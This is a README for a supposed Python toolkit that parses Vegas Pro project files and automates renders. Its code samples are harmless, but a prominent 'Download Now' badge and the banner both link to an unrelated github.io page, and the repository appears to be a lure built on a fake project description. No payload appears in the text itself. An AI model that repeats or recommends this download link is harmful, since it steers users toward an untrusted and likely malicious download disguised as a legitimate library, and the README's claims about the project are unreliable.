# vegas-pro-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://ZalaVidmar.github.io/vegas-info-dhi/)


[![Banner](banner.png)](https://ZalaVidmar.github.io/vegas-info-dhi/)


[![PyPI version](https://badge.fury.io/py/vegas-pro-toolkit.svg)](https://badge.fury.io/py/vegas-pro-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform: Windows](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A Python toolkit for automating workflows, processing project files, and extracting metadata from **Vegas Pro** (by MAGIX Software GmbH) on Windows environments.

Vegas Pro is a professional non-linear video editing application widely used for film, broadcast, and content production. This toolkit provides a programmatic interface to interact with Vegas Pro project files (`.veg`), automate repetitive editing tasks, and extract timeline and media data for analysis or integration with other pipelines.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 📂 **Project File Parsing** — Read and write Vegas Pro `.veg` project files to inspect or modify timeline structure programmatically
- 🎬 **Timeline Automation** — Automate track creation, event placement, and media assignment without opening the Vegas Pro GUI
- 🔍 **Metadata Extraction** — Extract clip duration, frame rate, resolution, and codec information from media referenced in a project
- 📊 **Render Queue Management** — Programmatically build and submit batch render jobs using Vegas Pro's scripting interface
- 🔗 **COM Automation Bridge** — Interface directly with Vegas Pro on Windows via the COM automation API for live session control
- 🗂️ **Asset Inventory** — Scan a project and generate structured reports (JSON/CSV) of all referenced media files and their properties
- ⚙️ **Workflow Templating** — Apply reusable project templates to standardize output settings across multiple productions
- 🧪 **CI/CD Integration** — Headless render triggering suitable for automated post-production pipelines

---

## Installation

### From PyPI

```bash
pip install vegas-pro-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/vegas-pro-toolkit.git
cd vegas-pro-toolkit
pip install -e ".[dev]"
```

### Optional Dependencies

For COM automation (live Vegas Pro control on Windows):

```bash
pip install vegas-pro-toolkit[com]
```

This installs `pywin32`, which is required to communicate with a running Vegas Pro instance via the Windows COM interface.

---

## Quick Start

```python
from vegas_pro_toolkit import VegasProject

# Load an existing Vegas Pro project file
project = VegasProject.load("C:/Projects/my_edit.veg")

# Print basic project info
print(f"Frame Rate : {project.frame_rate} fps")
print(f"Resolution : {project.width}x{project.height}")
print(f"Duration   : {project.duration_seconds:.2f}s")
print(f"Tracks     : {len(project.tracks)}")

# List all media files referenced in the project
for asset in project.media_pool:
    print(f"  [{asset.type}] {asset.filename}  ({asset.duration:.2f}s)")
```

**Example output:**

```
Frame Rate : 29.97 fps
Resolution : 1920x1080
Duration   : 342.80s
Tracks     : 6
  [video] C:/Footage/interview_a.mp4  (120.40s)
  [video] C:/Footage/b-roll_01.mp4   (45.10s)
  [audio] C:/Audio/music_bed.wav     (342.80s)
```

---

## Usage Examples

### 1. Extract Project Metadata to JSON

```python
import json
from vegas_pro_toolkit import VegasProject

project = VegasProject.load("C:/Projects/documentary.veg")

report = {
    "project_name": project.name,
    "frame_rate": project.frame_rate,
    "resolution": f"{project.width}x{project.height}",
    "duration_seconds": round(project.duration_seconds, 3),
    "track_count": len(project.tracks),
    "media_assets": [
        {
            "filename": asset.filename,
            "type": asset.type,
            "duration": round(asset.duration, 3),
            "codec": asset.codec,
        }
        for asset in project.media_pool
    ],
}

with open("project_report.json", "w") as f:
    json.dump(report, f, indent=2)

print("Report written to project_report.json")
```

---

### 2. Batch Scan a Directory of Projects

```python
from pathlib import Path
from vegas_pro_toolkit import VegasProject
from vegas_pro_toolkit.exceptions import ProjectParseError

project_dir = Path("C:/Projects/Season_02")

for veg_file in project_dir.glob("**/*.veg"):
    try:
        proj = VegasProject.load(str(veg_file))
        missing = [a for a in proj.media_pool if not Path(a.filename).exists()]
        if missing:
            print(f"[WARNING] {veg_file.name}: {len(missing)} missing asset(s)")
            for m in missing:
                print(f"    Missing: {m.filename}")
        else:
            print(f"[OK] {veg_file.name}")
    except ProjectParseError as e:
        print(f"[ERROR] Could not parse {veg_file.name}: {e}")
```

---

### 3. Automate Render Queue via COM (Requires Vegas Pro Running)

```python
from vegas_pro_toolkit.com import VegasComSession
from vegas_pro_toolkit.render import RenderPreset

# Connect to a running Vegas Pro instance on Windows
with VegasComSession() as vegas:
    project = vegas.get_active_project()

    # Apply a render preset by name
    preset = RenderPreset.from_name("Sony AVC/MVC, 1080p 29.97fps")

    job = vegas.queue_render(
        project=project,
        output_path="C:/Renders/episode_03_final.mp4",
        preset=preset,
        start_timecode="00:00:00;00",
        end_timecode="00:12:34;15",
    )

    print(f"Render job queued: {job.job_id}")
    job.wait()  # blocks until render completes
    print(f"Render complete. Output: {job.output_path}")
```

---

### 4. Apply a Workflow Template to Multiple Projects

```python
from vegas_pro_toolkit import VegasProject
from vegas_pro_toolkit.templates import WorkflowTemplate

# Load a reusable template (e.g., standard broadcast output settings)
template = WorkflowTemplate.load("templates/broadcast_hd.json")

source_files = [
    "C:/Projects/ep01_rough.veg",
    "C:/Projects/ep02_rough.veg",
    "C:/Projects/ep03_rough.veg",
]

for path in source_files:
    proj = VegasProject.load(path)
    template.apply(proj)
    output_path = path.replace("_rough.veg", "_broadcast.veg")
    proj.save(output_path)
    print(f"Template applied → {output_path}")
```

---

### 5. Generate a CSV Asset Inventory

```python
import csv
from vegas_pro_toolkit import VegasProject

project = VegasProject.load("C:/Projects/feature_film.veg")

with open("asset_inventory.csv", "w", newline="") as csvfile:
    fieldnames = ["filename", "type", "codec", "duration", "exists_on_disk"]
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()

    from pathlib import Path

    for asset in project.media_pool:
        writer.writerow({
            "filename": asset.filename,
            "type": asset.type,
            "codec": asset.codec,
            "duration": round(asset.duration, 3),
            "exists_on_disk": Path(asset.filename).exists(),
        })

print(f"Inventory exported: {len(project.media_pool)} assets listed.")
```

---

## Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | 3.8 or higher | Tested on 3.8, 3.10, 3.12 |
| Operating System | Windows 10 / 11 | COM features require Windows; file parsing works cross-platform |
| Vegas Pro | 18, 19, 20, 21 | Required for COM automation; not required for `.veg` file parsing |
| `lxml` | ≥ 4.9 | XML parsing of `.veg` project files |
| `pywin32` | ≥ 306 | Required only for COM automation (`vegas-pro-toolkit[com]`) |
| `click` | ≥ 8.0 | CLI interface |
| `rich` | ≥ 13.0 | Terminal output formatting |

---

## Project Structure

```
vegas-pro-toolkit/
├── vegas_pro_toolkit/
│   ├── __init__.py
│   ├── project.py          # VegasProject class, .veg file parser
│   ├── com.py              # Windows COM automation bridge
│   ├── render.py           # Render queue and preset management
│   ├── templates.py        # Workflow template engine
│   ├── cli.py              # Command-line interface entry points
│   └── exceptions.py       # Custom exception types
├── tests/
│   ├── test_project.py
│   ├── test_render.py
│   └── fixtures/           # Sample .veg files for testing
├── docs/
├── pyproject.toml
└── README.md
```

---

## CLI Usage

The toolkit also ships with a command-line interface:

```bash
# Inspect a project file
vegas-toolkit inspect "C:/Projects/my_edit.veg"

# Check for missing media assets
vegas-toolkit check-assets "C:/Projects/my_edit.veg"

# Export asset inventory to CSV
vegas-toolkit export-assets "C:/Projects/my_edit.veg" --format csv --output assets.csv

# Batch scan a folder
vegas-toolkit scan "C:/Projects/Season_02" --recursive
```

---

## Contributing

Contributions are welcome. Please follow these steps:

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/your-feature-name`
3. Write tests for new functionality under `tests/`
4. Ensure all tests pass: `pytest --cov=vegas_pro_toolkit`
5. Run the linter: `black . && flake8`
6. Submit a pull request with a clear description of the change

For bug reports or feature requests, please open an issue using the appropriate template.

---

## Disclaimer

This toolkit is an **independent open-source project** and is not affiliated with, endorsed by, or sponsored by MAGIX Software GmbH. "Vegas Pro" is a trademark of MAGIX Software GmbH. This library interacts with Vegas Pro project files and its published COM automation interface.

---

## License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2024 vegas-pro-toolkit contributors

Permission is hereby granted, free of charge,